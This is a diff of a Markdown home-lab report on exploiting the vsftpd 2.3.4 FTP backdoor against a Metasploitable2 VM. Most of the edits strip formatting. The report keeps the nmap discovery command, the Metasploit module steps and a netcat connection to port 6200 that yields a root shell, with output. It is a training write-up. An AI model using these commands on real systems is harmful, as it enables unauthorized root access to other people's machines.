@@ -1,14 +1,14 @@
-# 📊 Cybersecurity Home Lab - Report Template
+#  Cybersecurity Home Lab - Report Template
 
 ## Lab Title: Exploiting FTP Backdoor Vulnerability (vsftpd 2.3.4)
 
-### 🎯 Objective
+###  Objective
 
 Demonstrate identification and exploitation of a known FTP vulnerability (vsftpd 2.3.4) to achieve unauthorized remote shell access.
 
----
 
-### 💽 Lab Environment
+
+### Lab Environment
 
 | Component        | Configuration                            |
 | ---------------- | ---------------------------------------- |
@@ -16,9 +16,9 @@ Demonstrate identification and exploitation of a known FTP vulnerability (vsftpd
 | Target Machine   | Metasploitable2 (Host-only Network)      |
 | Network Setup    | Host-only Adapter + NAT for Kali         |
 
----
 
-### 🔎 Vulnerability Details
+
+###  Vulnerability Details
 
 | Property       | Value                                              |
 | -------------- | -------------------------------------------------- |
@@ -31,36 +31,33 @@ Demonstrate identification and exploitation of a known FTP vulnerability (vsftpd
 
 Reference: [Rapid7 Module](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)
 
----
+
 
 ### 🛠️ Exploitation Steps
 
 #### 1. Discovery - Nmap Scan
 
-```bash
+
 nmap -sV 192.168.56.102 -p 21
-```
+
 
 **Result**:
 
-```
+
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
-```
+
 
 #### 2. Exploit with Metasploit
 
-```bash
 msfconsole
 use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.102
 set RPORT 21
 run
-```
 
 **Result**:
 
-```
 [*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 192.168.56.102:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
@@ -68,25 +65,19 @@ run
 
 #### 3. Manual Shell Access
 
-```bash
 nc 192.168.56.102 6200
 whoami
-```
+
 
 **Result**:
-
-```
 root
-```
 
----
-
-### ✅ Outcome
+###  Outcome
 
 * Successfully accessed root shell manually after exploit.
 * Metasploit failed to open session but backdoor was live on port 6200.
 
-### 📸 Screenshots
+###  Screenshots
 
 * Nmap scan result: ![Nmap_Scan](nmap_scan_result.png)
 * Metasploit output and Netcat shell with 'root' : ![metasploit_output](exploit_result.png)
@@ -94,23 +85,13 @@ root
 * kali ping target : ![kali-ping](kali_ping_target.png)
 * metasploitable network setup: ![metasploit_net](meta-network-set.png)
 
----
-
-### 📂 Files Included
-
-* `vsftpd_exploit.txt` – Exploit commands
-* `screenshots/lab1/` – Screenshots folder
-
----
 ## Target Information
 
 * Target IP: 192.168.56.102
 * OS and Services (nmap result):
 
-```
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 2.3.4
-```
 
 ## Vulnerability Details
 
